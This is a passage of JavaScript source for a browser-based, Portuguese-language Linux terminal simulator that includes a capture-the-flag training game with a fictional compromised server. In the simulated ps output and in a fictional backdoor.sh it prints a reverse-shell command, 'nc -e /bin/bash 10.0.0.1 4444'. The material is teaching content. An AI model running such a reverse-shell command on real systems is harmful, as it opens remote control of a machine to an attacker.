        if (e.name.endsWith('.sh')) return `<span style="color:var(--green)">${escapeHtml(e.name)}*</span>`;
        return `<span class="hl-value">${escapeHtml(e.name)}</span>`;
      }).join('  ');
      print(row, 'output');
    }
    return true;
  }
  print(`total ${entries.length * 4}`, 'output-dim');
  const now = new Date();
  const months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
  for (const e of entries) {
    const isDir  = e.type === 'dir';
    const perms  = isDir ? 'drwxr-xr-x' : '-rw-r--r--';
    const size   = humanR ? (isDir ? '4.0K' : '  1K') : (isDir ? '4096' : ' 512');
    const time   = `${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
    const nameStr = isDir ? `<span style="color:var(--cyan);font-weight:700">${escapeHtml(e.name)}</span>`
      : e.name.endsWith('.sh') ? `<span style="color:var(--green)">${escapeHtml(e.name)}</span>`
      : `<span class="hl-value">${escapeHtml(e.name)}</span>`;
    print(`<span class="output-dim">${perms}  ${isDir?2:1} ${state.user} ${state.user} ${String(size).padStart(5)} ${months[now.getMonth()]} ${String(now.getDate()).padStart(2,' ')} ${time} </span>${nameStr}`, 'output');
  }
  return true;
}

function cmdCd(args) {
  const target  = args[0] || '~';
  const newPath = resolvePath(state.cwd, target);
  const node    = getNode(newPath);
  if (!node) { print(`cd: ${target}: Arquivo ou diretorio nao encontrado`, 'error'); return; }
  if (node.type !== 'dir') { print(`cd: ${target}: Nao e um diretorio`, 'error'); return; }
  if (target === '-') print(newPath, 'output');
  state.prevDir = state.cwd;
  state.cwd = newPath;
  updatePrompt();
}

function cmdMkdir(flags, args) {
  if (!args.length) { print('mkdir: informe o nome do diretorio', 'error'); return false; }
  const parents = flags.includes('-p');
  let ok = true;
  for (const arg of args) {
    let argOk = true;
    const parts = resolvePath(state.cwd, arg).split('/').filter(Boolean);
    let cur = FS['/'];
    for (let i = 0; i < parts.length - 1; i++) {
      if (!cur || cur.type !== 'dir' || !cur.children) {
        print(`mkdir: nao e possivel criar '${arg}': Nao e um diretorio`, 'error');
        ok = false; argOk = false;
        break;
      }
      if (!cur.children[parts[i]]) {
        if (!parents) { print(`mkdir: nao e possivel criar '${arg}': Diretorio pai nao encontrado`, 'error'); return false; }
        cur.children[parts[i]] = { type:'dir', children:{} };
      }
      cur = cur.children[parts[i]];
    }
    if (!argOk) continue;
    if (!cur || cur.type !== 'dir' || !cur.children) {
      print(`mkdir: nao e possivel criar '${arg}': Nao e um diretorio`, 'error');
      ok = false;
      continue;
    }
    const name = parts[parts.length-1];
    if (cur.children[name]) { print(`mkdir: nao e possivel criar '${arg}': O arquivo ja existe`, 'error'); ok = false; continue; }
    cur.children[name] = { type:'dir', children:{} };
    if (flags.includes('-v')) print(`mkdir: criado diretorio '${arg}'`, 'success');
  }
  return ok;
}

function cmdTouch(args) {
  for (const arg of args) {
    const { parent, name } = getParentAndNode(resolvePath(state.cwd, arg));
    if (!parent) { print(`touch: nao e possivel acessar '${arg}': Diretorio nao encontrado`, 'error'); continue; }
    if (!parent.children[name]) parent.children[name] = { type:'file', content:'' };
  }
}

function cmdFile(args) {
  if (!args.length) { print('file: informe um arquivo', 'error'); return; }
  for (const arg of args) {
    const node = getNode(resolvePath(state.cwd, arg));
    if (!node) { print(`${arg}: cannot open (No such file or directory)`, 'error'); continue; }
    if (node.type === 'dir') { print(`${arg}: directory`, 'output'); continue; }
    const content = node.content || '';
    let type = 'ASCII text';
    if (arg.endsWith('.sh') || content.startsWith('#!/bin/bash')) type = 'Bourne-Again shell script, ASCII text executable';
    else if (arg.endsWith('.md')) type = 'Markdown document, ASCII text';
    else if (arg.endsWith('.enc')) type = 'data';
    else if (arg.endsWith('.html')) type = 'HTML document, ASCII text';
    print(`${arg}: ${type}`, 'output');
  }
}

function cmdRm(flags, args) {
  const recursive = flags.some(f => f.includes('r') || f.includes('R'));
  const force     = flags.some(f => f.includes('f'));
  for (const arg of args) {
    const { parent, name } = getParentAndNode(resolvePath(state.cwd, arg));
    if (!parent || !parent.children[name]) { if (!force) print(`rm: nao e possivel remover '${arg}': Nao encontrado`, 'error'); continue; }
    if (parent.children[name].type === 'dir' && !recursive) { print(`rm: nao e possivel remover '${arg}': E um diretorio`, 'error'); continue; }
    delete parent.children[name];
    if (flags.includes('-v')) print(`removido '${arg}'`, 'output-dim');
  }
}

function cmdCp(flags, args) {
  if (args.length < 2) { print('cp: informe origem e destino', 'error'); return false; }
  const srcNode = getNode(resolvePath(state.cwd, args[0]));
  if (!srcNode) { print(`cp: '${args[0]}': Nao encontrado`, 'error'); return false; }
  if (srcNode.type === 'dir' && !flags.some(f => f.includes('r') || f.includes('R'))) {
    print(`cp: -r nao especificado; omitindo diretorio '${args[0]}'`, 'error');
    return false;
  }
  const dst = resolvePath(state.cwd, args[1]);
  const dstNode = getNode(dst);
  const { parent: dp, name: dn } = getParentAndNode(dst);
  if (dstNode && dstNode.type === 'dir') dstNode.children[dirName(resolvePath(state.cwd,args[0]))] = JSON.parse(JSON.stringify(srcNode));
  else if (dp && dp.type === 'dir') dp.children[dn] = JSON.parse(JSON.stringify(srcNode));
  else { print(`cp: nao e possivel criar '${args[1]}': Diretorio de destino nao encontrado`, 'error'); return false; }
  if (flags.includes('-v')) print(`'${args[0]}' -> '${args[1]}'`, 'output-dim');
  return true;
}

function cmdMv(flags, args) {
  if (args.length < 2) { print('mv: informe origem e destino', 'error'); return false; }
  const src = resolvePath(state.cwd, args[0]);
  const dst = resolvePath(state.cwd, args[1]);
  const { parent: sp, name: sn } = getParentAndNode(src);
  if (!sp || !sp.children[sn]) { print(`mv: '${args[0]}': Nao encontrado`, 'error'); return false; }
  const srcNode = sp.children[sn];
  const dstNode = getNode(dst);
  const { parent: dp, name: dn } = getParentAndNode(dst);
  if (dstNode && dstNode.type === 'dir') dstNode.children[sn] = srcNode;
  else if (dp && dp.type === 'dir') dp.children[dn] = srcNode;
  else { print(`mv: nao e possivel mover para '${args[1]}': Diretorio de destino nao encontrado`, 'error'); return false; }
  delete sp.children[sn];
  if (flags.includes('-v')) print(`'${args[0]}' -> '${args[1]}'`, 'output-dim');
  if (state.cwd === src) { state.cwd = dst; updatePrompt(); }
  return true;
}

function cmdCat(flags, args, elevated) {
  if (!args.length) { print('cat: informe um arquivo', 'error'); return false; }
  let ok = true;
  for (const arg of args) {
    const path = resolvePath(state.cwd, arg);
    const node = getNode(path);
    if (!node) { print(`cat: ${arg}: Arquivo ou diretorio nao encontrado`, 'error'); ok = false; continue; }
    if (node.type === 'dir') { print(`cat: ${arg}: E um diretorio`, 'error'); ok = false; continue; }
    if (path.startsWith('/root') && !elevated) {
      print(`cat: ${arg}: Permissao negada`, 'error');
      ok = false;
      continue;
    }
    if (!canRevealCTFNode(node, path)) { ok = false; continue; }
    node.content.split('\n').forEach((line, i) => {
      const prefix = flags.includes('-n') ? `<span class="output-dim">${String(i+1).padStart(6)} </span>` : '';
      print(prefix + escapeHtml(line), 'output');
    });
  }
  return ok;
}

function cmdEcho(flags, args) {
  print(escapeHtml(args.map(a => a.replace(/\$(\w+)/g, (_, v) => state.env[v] || '')).join(' ')), 'output');
}

function cmdPwd() { print(state.cwd, 'output'); }

function cmdGrep(flags, args) {
  if (!args.length) { print('grep: informe um padrao', 'error'); return; }
  const [pattern, ...files] = args;
  const ci = flags.includes('-i'), showN = flags.includes('-n'), invert = flags.includes('-v'), countOnly = flags.includes('-c');
  let regex;
  try { regex = new RegExp(pattern, ci ? 'i' : ''); } catch { print(`grep: expressao regular invalida: ${pattern}`, 'error'); return; }
  if (!files.length) { print('grep: informe um arquivo', 'error'); return; }
  for (const arg of files) {
    const path = resolvePath(state.cwd, arg);
    const node = getNode(path);
    if (!node) { print(`grep: ${arg}: Nao encontrado`, 'error'); continue; }
    if (node.type === 'dir') { print(`grep: ${arg}: E um diretorio`, 'error'); continue; }
    if (path.startsWith('/root')) { print(`grep: ${arg}: Permissao negada`, 'error'); continue; }
    if (!canRevealCTFNode(node, path)) continue;
    let cnt = 0;
    node.content.split('\n').forEach((line, i) => {
      const match = regex.test(line);
      if (invert ? !match : match) {
        cnt++;
        if (!countOnly) {
          const prefix = showN ? `<span class="output-dim">${arg}:${i+1}:</span>` : (files.length > 1 ? `<span class="output-dim">${arg}:</span>` : '');
          print(prefix + line.replace(regex, m => `<span class="hl-cmd">${escapeHtml(m)}</span>`), 'output');
        }
      }
    });
    if (countOnly) print(`${arg}: ${cnt}`, 'output');
  }
}

function cmdFind(flags, args) {
  const startPath = resolvePath(state.cwd, args[0] || '.');
  if (startPath.startsWith('/root')) { print(`find: '${args[0] || startPath}': Permissao negada`, 'error'); return; }
  const ni = args.indexOf('-name'), ti = args.indexOf('-type');
  const namePat = ni >= 0 ? args[ni+1] : null;
  const typeF   = ti >= 0 ? args[ti+1] : null;
  function search(path, node) {
    if (!node) return;
    const name = dirName(path) || '/';
    let show = true;
    if (namePat) { const rx = new RegExp('^' + namePat.replace(/\*/g,'.*').replace(/\?/g,'.') + '$'); show = rx.test(name); }
    if (typeF) show = show && ((typeF==='f'&&node.type==='file')||(typeF==='d'&&node.type==='dir'));
    if (show && path !== startPath) print(path, 'output');
    if (node.type === 'dir') Object.entries(node.children).forEach(([cn,cv]) => {
      const childPath = path==='/'?'/'+cn:path+'/'+cn;
      if (childPath.startsWith('/root')) return;
      search(childPath, cv);
    });
  }
  search(startPath, getNode(startPath));
}

function cmdWhich(args) {
  if (!args.length) { print('which: informe um comando', 'error'); return; }
  args.forEach(cmd => {
    if (COMMANDS_DB[cmd] || ['bash','sh','python','node','vim'].includes(cmd)) print(`/usr/bin/${cmd}`, 'output');
    else print(`which: no ${cmd} in (${state.env.PATH})`, 'error');
  });
}

function cmdChmod(args) {
  if (args.length < 2) { print('chmod: informe o modo e o arquivo', 'error'); return; }
  if (!getNode(resolvePath(state.cwd, args[1]))) { print(`chmod: '${args[1]}': Nao encontrado`, 'error'); return; }
  print(`Permissoes de '${args[1]}' alteradas para ${args[0]}`, 'success');
}

function cmdChown(args) {
  if (args.length < 2) { print('chown: informe o dono e o arquivo', 'error'); return; }
  if (!getNode(resolvePath(state.cwd, args[1]))) { print(`chown: '${args[1]}': Nao encontrado`, 'error'); return; }
  print(`Dono de '${args[1]}' alterado para '${args[0]}'`, 'success');
}

function cmdPs(flags, args) {
  const usedDashAux = flags.some(f => f === '-aux' || f === '-uxa' || f === '-xua');
  const full = args.includes('aux') || flags.some(f => /[ae]/.test(f.replace('-','')) && !usedDashAux);
  print('  PID TTY          TIME CMD', 'output-dim');
  if (usedDashAux) print('ps: use "ps aux" sem hifen para listar todos os processos nesta missao.', 'warning');
  [['    1','?    ','00:00:02','systemd'],[' 1337','pts/0','00:00:00','bash'],[' 2048','?    ','00:01:23','sshd'],[' 3141','?    ','00:00:05','cron']].forEach(p => print(p.join('  '), 'output'));
  if (full) {
    [['  4096','pts/1','00:00:00','ps'],[' 9999','?    ','00:02:11','nginx: master'],['10000','?    ','00:00:44','nginx: worker']].forEach(p => print(p.join('  '), 'output'));
    if (CTF.active && !CTF.flags.flag5.found) {
      if (!canCaptureCTFKey('flag5')) { warnCTFOutOfOrder('flag5'); return; }
      print(' 6660 ?    00:00:00 .bash_hidden  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
      print(' 6661 ?    00:00:01 nc -e /bin/bash 10.0.0.1 4444  <span style="color:var(--red)">[SUSPEITO]</span>', 'error');
      printBlank();
      print('ALERTA: PROCESSO SUSPEITO DETECTADO!', 'warning');
      print('╔══════════════════════════════════════════╗', 'success');
      print('║  FLAG{PR0C3SS0_SUSP3IT0_PS_AUX_5}     ║', 'success');
      print('╚══════════════════════════════════════════╝', 'success');
      print('Flag 5/10 — [Processos]', 'success');
      print('Proxima missao: leia /etc/hosts para investigar entradas de rede suspeitas', 'info');
      setTimeout(() => captureFlag('flag5'), 150);
    }
  }
}

function cmdKill(flags, args) {
  if (!args[0]) { print('kill: informe o PID', 'error'); return; }
  const sig = flags.includes('-9') ? 'SIGKILL (9)' : flags.includes('-1') ? 'SIGHUP (1)' : 'SIGTERM (15)';
  print(`Sinal ${sig} enviado para o processo ${args[0]}`, 'success');
}

function cmdTop() {
  print('top - ' + new Date().toLocaleTimeString('pt-BR') + '  up 3 days,  load average: 0.12, 0.08, 0.05', 'output-dim');
  print('Tasks: 142 total,   1 running, 141 sleeping,   0 stopped,   0 zombie', 'output');
  print('%Cpu(s):  2.3 us,  0.5 sy,  0.0 ni, 97.0 id,  0.1 wa', 'output');
  print('MiB Mem :   7948.0 total,   2134.5 free,   3201.2 used', 'info');
  printBlank();
  print('  PID USER      PR  NI    VIRT    RES S  %CPU  %MEM  COMMAND', 'output-dim');
  [' 9999 www-data  20   0  123456  45678 S   2.3   0.6  nginx',' 1337 usuario   20   0   32456   8765 S   0.3   0.1  bash','    1 root      20   0  168540  12876 S   0.0   0.2  systemd'].forEach(r=>print(r,'output'));
  print('<span class="output-dim">Simulacao: use clear para sair</span>', 'output-dim');
}

function cmdDf(flags) {
  print('<span class="output-dim">Filesystem      Tamanho  Usado  Disp  Uso%  Ponto</span>', 'output');
  [['/dev/sda1','50G','18G','30G','38%','/'],['/dev/sda2','20G','5G','14G','27%','/home'],['tmpfs','3.9G','0','3.9G','0%','/dev/shm']].forEach(r=>print(r.map(c=>c.padEnd(10)).join('  '),'output'));
}

function cmdDu(flags, args) {
  const node = getNode(resolvePath(state.cwd, args[0] || '.'));
  if (!node) { print(`du: '${args[0]}': Nao encontrado`, 'error'); return; }
  if (node.type === 'dir') { Object.entries(node.children).forEach(([name,n])=>print(`${n.type==='dir'?'4,0K':'  1K'}\t${name}`,'output')); print('4,0K\t.','output'); }
  else print(`1K\t${args[0]}`, 'output');
}

function cmdFree(flags) {
  const h = flags.includes('-h');
  const fmt = n => h ? n+'Mi' : String(n*1024);
  print('               total        usado        livre      disponivel', 'output-dim');
  print(`Mem:        ${fmt(7948).padStart(12)} ${fmt(3201).padStart(12)} ${fmt(2134).padStart(12)} ${fmt(4321).padStart(12)}`, 'output');
  print(`Swap:       ${fmt(2048).padStart(12)} ${fmt(0).padStart(12)} ${fmt(2048).padStart(12)}`, 'output');
}

function cmdTar(flags, args) {
  const c=flags.some(f=>f.includes('c')), x=flags.some(f=>f.includes('x')), t=flags.some(f=>f.includes('t'));
  if (c) { print(`Criando: ${args[0]||'arquivo.tar.gz'}`, 'output-dim'); args.slice(1).forEach(s=>print(`  adicionando: ${s}`,'output')); print('Criado com sucesso.','success'); }
  else if (x) { print(`Extraindo: ${args[0]}`, 'output-dim'); print('Extracao concluida.','success'); }
  else if (t) { ['arquivo1.txt','arquivo2.txt','pasta/'].forEach(l=>print(l,'output')); }
  else print('tar: informe -c (criar), -x (extrair), -t (listar)', 'error');
}

function optionValue(raw, opt, fallback) {
  const compact = raw.find(t => t.startsWith(opt) && t.length > opt.length);
  if (compact) return compact.slice(opt.length);
  const idx = raw.indexOf(opt);
  return idx >= 0 ? raw[idx + 1] : fallback;
}

function argsWithoutOptionValue(raw, opt) {
  const out = [];
  for (let i = 0; i < raw.length; i++) {
    const t = raw[i];
    if (t === opt) { i++; continue; }
    if (t.startsWith(opt) && t.length > opt.length) continue;
    if (t.startsWith('-')) continue;
    out.push(t);
  }
  return out;
}

function cmdHead(flags, args, raw) {
  const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
  args = argsWithoutOptionValue(raw, '-n');
  if (!args.length) { print('head: informe um arquivo','error'); return; }
  const path = resolvePath(state.cwd, args[0]);
  const node = getNode(path);
  if (!node) { print(`head: '${args[0]}': Nao encontrado`,'error'); return; }
  if (node.type === 'dir') { print(`head: '${args[0]}': E um diretorio`,'error'); return; }
  if (path.startsWith('/root')) { print(`head: '${args[0]}': Permissao negada`,'error'); return; }
  if (!canRevealCTFNode(node, path)) return;
  node.content.split('\n').slice(0,n).forEach(l=>print(escapeHtml(l),'output'));
}

function cmdTail(flags, args, raw) {
  const n = parseInt(optionValue(raw, '-n', '10'), 10) || 10;
  args = argsWithoutOptionValue(raw, '-n');
  if (!args.length) { print('tail: informe um arquivo','error'); return; }
  const path = resolvePath(state.cwd, args[0]);
  const node = getNode(path);
  if (!node) { print(`tail: '${args[0]}': Nao encontrado`,'error'); return; }
  if (node.type === 'dir') { print(`tail: '${args[0]}': E um diretorio`,'error'); return; }
  if (path.startsWith('/root')) { print(`tail: '${args[0]}': Permissao negada`,'error'); return; }
  if (!canRevealCTFNode(node, path)) return;
  node.content.split('\n').slice(-n).forEach(l=>print(escapeHtml(l),'output'));
  if (flags.includes('-f')) print(`<span class="output-dim">tail: seguindo '${args[0]}' (simulacao)</span>`,'output');
}

function cmdSort(flags, args) {
  if (!args.length) { print('sort: informe um arquivo','error'); return; }
  const path = resolvePath(state.cwd, args[0]);
  const node = getNode(path);
  if (!node) { print(`sort: '${args[0]}': Nao encontrado`,'error'); return; }
  if (node.type === 'dir') { print(`sort: '${args[0]}': E um diretorio`,'error'); return; }
  if (path.startsWith('/root')) { print(`sort: '${args[0]}': Permissao negada`,'error'); return; }
  if (!canRevealCTFNode(node, path)) return;
  let lines = node.content.split('\n').filter(Boolean);
  if (flags.includes('-n')) lines.sort((a,b)=>parseFloat(a)-parseFloat(b)); else lines.sort();
  if (flags.includes('-r')) lines.reverse();
  if (flags.includes('-u')) lines = [...new Set(lines)];
  lines.forEach(l=>print(escapeHtml(l),'output'));
}

function cmdWc(flags, args) {
  if (!args.length) { print('wc: informe um arquivo','error'); return; }
  const path = resolvePath(state.cwd, args[0]);
  const node = getNode(path);
  if (!node) { print(`wc: '${args[0]}': Nao encontrado`,'error'); return; }
  if (node.type === 'dir') { print(`wc: '${args[0]}': E um diretorio`,'error'); return; }
  if (path.startsWith('/root')) { print(`wc: '${args[0]}': Permissao negada`,'error'); return; }
  const c=node.content, lns=c.split('\n').length, wds=c.trim().split(/\s+/).length, bts=new Blob([c]).size;
  if (flags.includes('-l')) { print(`${String(lns).padStart(7)} ${args[0]}`,'output'); return; }
  if (flags.includes('-w')) { print(`${String(wds).padStart(7)} ${args[0]}`,'output'); return; }
  if (flags.includes('-c')) { print(`${String(bts).padStart(7)} ${args[0]}`,'output'); return; }
  print(`${String(lns).padStart(7)} ${String(wds).padStart(7)} ${String(bts).padStart(7)} ${args[0]}`,'output');
}

function cmdLess(args) {
  if (!args.length) { print('less: informe um arquivo','error'); return; }
  const path = resolvePath(state.cwd, args[0]);
  const node = getNode(path);
  if (!node) { print(`less: '${args[0]}': Nao encontrado`,'error'); return; }
  if (node.type === 'dir') { print(`less: '${args[0]}': E um diretorio`,'error'); return; }
  if (path.startsWith('/root')) { print(`less: '${args[0]}': Permissao negada`,'error'); return; }
  if (!canRevealCTFNode(node, path)) return;
  node.content.split('\n').slice(0,20).forEach((l,i)=>print(`<span class="output-dim">${String(i+1).padStart(3)} </span>${escapeHtml(l)}`,'output'));
  print('<span class="output-dim">Simulacao: use cat para ver tudo</span>','output-dim');
}

function cmdMan(args) {
  if (!args.length) { print('Que manual? Tente: man ls','error'); return; }
  const db = COMMANDS_DB[args[0]];
  if (!db) { print(`Nenhuma entrada no manual para ${args[0]}`,'error'); return; }
  printBlank();
  print(`<span class="hl-cmd">${args[0].toUpperCase()}(1)</span>                  Manual do Usuario Linux`,'info');
  printBlank();
  print('<span class="hl-flag">NOME</span>','output'); print(`       ${args[0]} — ${db.desc}`,'output'); printBlank();
  print('<span class="hl-flag">SINOPSE</span>','output'); print(`       ${db.usage}`,'output'); printBlank();
  if (db.flags && Object.keys(db.flags).length) {
    print('<span class="hl-flag">OPCOES</span>','output');
    Object.entries(db.flags).forEach(([f,d])=>print(`       <span class="hl-cmd">${f.padEnd(12)}</span> ${d}`,'output'));
    printBlank();
  }
  print('<span class="hl-flag">EXEMPLOS</span>','output');
  db.examples.forEach(e=>print(`       $ <span class="hl-value">${escapeHtml(e)}</span>`,'output'));
  printBlank();
  if (db.tip) { print('<span class="hl-flag">DICA</span>','output'); print(`       <span style="color:var(--amber)">${escapeHtml(db.tip)}</span>`,'output'); printBlank(); }
}

function cmdHistory(args) {
  const n = parseInt(args[0]) || state.history.length;
  state.history.slice(-n).forEach((cmd,i)=>print(`<span class="output-dim">${String(state.history.length-Math.min(n,state.history.length)+i+1).padStart(5)}</span>  ${escapeHtml(cmd)}`,'output'));
}

function cmdHelp(args) {
  if (args.length) {
    const db = COMMANDS_DB[args[0]];
    if (!db) { print(`help: sem informacoes sobre '${args[0]}'`,'error'); return; }
    printBlank(); print(`<span class="hl-cmd">${args[0]}</span> — ${db.desc}`,'success');
    print(`Uso: <span class="hl-value">${db.usage}</span>`,'output');
    if (db.tip) print(`<span style="color:var(--amber)">  ${escapeHtml(db.tip)}</span>`,'output');
    printBlank(); print('Exemplos:','output-dim');
    db.examples.forEach(e=>print(`  $ <span class="hl-value">${escapeHtml(e)}</span>`,'output'));
    return;
  }
  printBlank();
  print('╔══════════════════════════════════════════════════════════════╗','separator');
  print('║            LINUX TERMINAL — COMANDOS DISPONIVEIS             ║','success');
  print('╚══════════════════════════════════════════════════════════════╝','separator');
  printBlank();
  print('Use o menu lateral para explorar por categoria. Clique para inserir exemplos.','info');
  printBlank();
  Object.entries(CATEGORIES).forEach(([cat,{cmds}])=>{
    const icon = CATEGORY_ICONS[cat] || '';
    print(`<span class="hl-flag">${icon} ${cat}</span>`,'output');
    print('  '+cmds.map(c=>`<span class="hl-cmd">${c}</span>`).join('  '),'output');
    printBlank();
  });
  print('<span class="output-dim">Seta para cima/baixo = historico | Tab = autocompletar | Ctrl+L = limpar</span>','output-dim');
  printBlank();
}

function cmdEnv() { Object.entries(state.env).forEach(([k,v])=>print(`<span class="hl-cmd">${k}</span>=<span class="hl-value">${escapeHtml(v)}</span>`,'output')); }
function cmdWhoami() { print(state.user,'output'); }
function cmdId(args) {
  const user = args[0] || state.user;
  print(`uid=1000(${user}) gid=1000(${user}) grupos=1000(${user}),27(sudo),100(users)`, 'output');
}
function cmdHostname(flags) {
  if (flags.includes('-I')) print('192.168.1.100 10.0.0.15', 'output');
  else print(state.hostname, 'output');
}
function cmdUptime() {
  const now = new Date().toLocaleTimeString('pt-BR', { hour12:false });
  print(`${now} up 3 days,  4:17,  1 user,  load average: 0.12, 0.08, 0.05`, 'output');
}
function cmdUname(flags) {
  if (flags.includes('-a')) print(`Linux ${state.hostname} 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux`,'output');
  else if (flags.includes('-r')) print('5.15.0-91-generic','output');
  else if (flags.includes('-m')) print('x86_64','output');
  else print('Linux','output');
}
function cmdDate(raw) {
  const now = new Date();
  if (raw[0] && raw[0].startsWith('+')) {
    print(raw[0].slice(1).replace('%Y',now.getFullYear()).replace('%m',String(now.getMonth()+1).padStart(2,'0')).replace('%d',String(now.getDate()).padStart(2,'0')).replace('%H',String(now.getHours()).padStart(2,'0')).replace('%M',String(now.getMinutes()).padStart(2,'0')).replace('%S',String(now.getSeconds()).padStart(2,'0')),'output');
  } else print(now.toLocaleString('pt-BR'),'output');
}
function cmdSudo(flags, args) {
  if (!args.length) { print('sudo: informe um comando','error'); return false; }
  if (args[0]==='apt') { cmdApt(flags, args.slice(1)); return true; }
  if (args[0]==='ls') { return cmdLs(flags, args.slice(1), true); }
  if (args[0]==='cat') { return cmdCat(flags, args.slice(1), true); }
  print(`[sudo] simulando execucao de: ${escapeHtml(args.join(' '))}`,'warning');
  return true;
}
function cmdApt(flags, args) {
  const sub = args[0];
  if (sub==='update') { print('Atingido:1 http://br.archive.ubuntu.com/ubuntu jammy InRelease','output-dim'); print('Lendo listas de pacotes... Pronto','success'); }
  else if (sub==='upgrade') { print('4 pacotes atualizados','success'); }
  else if (sub==='install'&&args[1]) { print(`(simulacao) ${args[1]} instalado.`,'success'); }
  else if (sub==='remove'&&args[1]) { print(`Removendo ${args[1]}... Pronto`,'success'); }
  else print('apt: uso: apt [update|upgrade|install|remove] [pacote]','output');
}
function cmdSsh(args) { if (!args.length) { print('ssh: informe usuario@host','error'); return; } print(`(simulacao) Conexao SSH estabelecida com ${args[0]}`,'success'); }
function cmdScp(args) { if (args.length<2) { print('scp: informe origem e destino','error'); return; } print('arquivo.txt          100%  1KB','output'); print('Transferencia concluida.','success'); }
function cmdWget(flags, args) {
  if (!args.length) { print('wget: informe uma URL','error'); return; }
  const name = args[0].split('/').pop()||'index.html';
  print(`Salvando em: '${name}'`,'output'); print(`(simulacao) '${name}' salvo.`,'success');
}
function cmdCurl(flags, args) {
  if (!args.length) { print('curl: informe uma URL','error'); return; }
  print(`{"status":"ok","url":"${args[0]}","message":"Resposta simulada"}`,'info');
}
function cmdPing(flags, args) {
  if (!args.length) { print('ping: informe um host','error'); return; }
  let cnt = 4;
  let host = args[0];
  if (flags.includes('-c') && /^\d+$/.test(args[0] || '')) {
    cnt = parseInt(args[0], 10);
    host = args[1];
  }
  if (!host) { print('ping: informe um host','error'); return; }
  print(`PING ${host} (93.184.216.34) 56(84) bytes de dados.`,'output');
  for (let i=0;i<Math.min(cnt,4);i++) print(`64 bytes de ${host}: icmp_seq=${i+1} ttl=55 time=${(20+Math.random()*30).toFixed(3)} ms`,'output');
  print(`${cnt} pacotes transmitidos, ${cnt} recebidos, 0% perda`,'success');
}
function cmdIfconfig() {
  print('eth0: flags=4163  mtu 1500','output');
  print('        inet 192.168.1.100  netmask 255.255.255.0','info');
  print('        ether 08:00:27:c4:8a:4e  txqueuelen 1000','output');
  printBlank();
  print('lo: flags=73  mtu 65536','output');
  print('        inet 127.0.0.1  netmask 255.0.0.0','info');
}

function cmdIp(args) {
  const sub = args[0] || 'addr';
  if (sub === 'addr' || sub === 'a') {
    print('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN', 'output');
    print('    inet 127.0.0.1/8 scope host lo', 'info');
    print('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP', 'output');
    print('    inet 192.168.1.100/24 brd 192.168.1.255 scope global eth0', 'info');
  } else if (sub === 'route' || sub === 'r') {
    print('default via 192.168.1.1 dev eth0 proto dhcp', 'output');
    print('192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.100', 'output');
  } else if (sub === 'link' || sub === 'l') {
    print('1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 state UNKNOWN mode DEFAULT', 'output');
    print('2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 state UP mode DEFAULT', 'output');
  } else {
    print('ip: uso: ip [addr|route|link]', 'output');
  }
}

// ══════════════════════════════════════════════════════
// CTF ENGINE
// ══════════════════════════════════════════════════════
function injectCTFFilesystem() {
  FS['/'].children.home.children.hacker = { type:'dir', children:{
    'briefing.txt': { type:'file', content:`=== MISSAO INFILTRACAO SIGMA ===\n\nAgente, voce tem acesso a este servidor comprometido.\nSeu objetivo: encontrar 10 flags escondidas pelos atacantes.\n\nPOR ONDE COMECAR:\n  Sua primeira tarefa e copiar o arquivo de notas do hacker\n  para preservar a evidencia antes de continua-la.\n\nDicas gerais:\n  - Copie e mova arquivos de evidencia com cp e mv\n  - Use ls e ls -a para explorar diretorios (incluindo ocultos)\n  - Leia arquivos com cat\n  - Use grep para buscar padroes suspeitos\n  - Verifique permissoes com ls -la\n  - Monitore processos com ps aux\n\nBoa sorte, Agente.\n                                    - Comando Central` },
    'notas_hacker.txt': { type:'file', content:`Notas pessoais - NAO APAGAR\n\n- Servidor comprometido em 2026-04-15 03:17 UTC\n- Deixei backdoor em /opt/missao/backdoor.sh\n- Senha do root escondida em /root/flag_secreta.txt\n- Logs adulterados em /var/log/intruso.log\n- Arquivo cifrado em ~/cifra.txt\n\nSe alguem ler isso... boa sorte :)` },
    '.segredo': { type:'file', content:`Voce e persistente. Bem-vindo ao lado oculto.\n\n╔══════════════════════════════════════════╗\n║  FLAG{R3C0N_M4ST3R_OCULTO_3}           ║\n╚══════════════════════════════════════════╝\n\nFlag 3/10 capturada! [Reconhecimento]\nProxima missao: navegue ate /opt/missao e leia o script backdoor.sh` },
    'cifra.txt': { type:'file', content:`== MENSAGEM CIFRADA ==\nDecodifique isto para encontrar a Flag 9:\n\ndHh0LmFkZXNjb2RpZmVkIHVtIG1hbmV6YW8=\n\n(A flag esta aqui abaixo!)\n\n╔══════════════════════════════════════════╗\n║  FLAG{CR1PT0_D3C0D3R_H4CK3R_9999}      ║\n╚══════════════════════════════════════════╝\n\nFlag 9/10 capturada! [Criptografia]\nProxima missao: acesse /root/flag_secreta.txt usando privilegios de superusuario` },
  }};
  FS['/'].children.opt.children.missao = { type:'dir', children:{
    'backdoor.sh': { type:'file', content:`#!/bin/bash\n# Script de backdoor instalado pelo atacante\n\necho "Conectando ao servidor C2..."\n# nc -e /bin/bash 10.0.0.1 4444\n\n╔══════════════════════════════════════════╗\n║  FLAG{P3RM1SS4O_SH_3X3CUT4V3L_4}       ║\n╚══════════════════════════════════════════╝\n\nFlag 4/10 capturada! [Permissoes]\nProxima missao: execute ps aux para monitorar os processos em execucao no sistema` },
    'README.md':   { type:'file', content:`# Missao Infiltracao\n\nEsta pasta foi usada pelo atacante como base de operacoes.\n\nArquivos:\n- backdoor.sh  (verifique permissoes com ls -la, depois leia com cat)\n- config.enc   (evidencia cifrada — deve ser movida para /tmp/analise/ com mv)` },
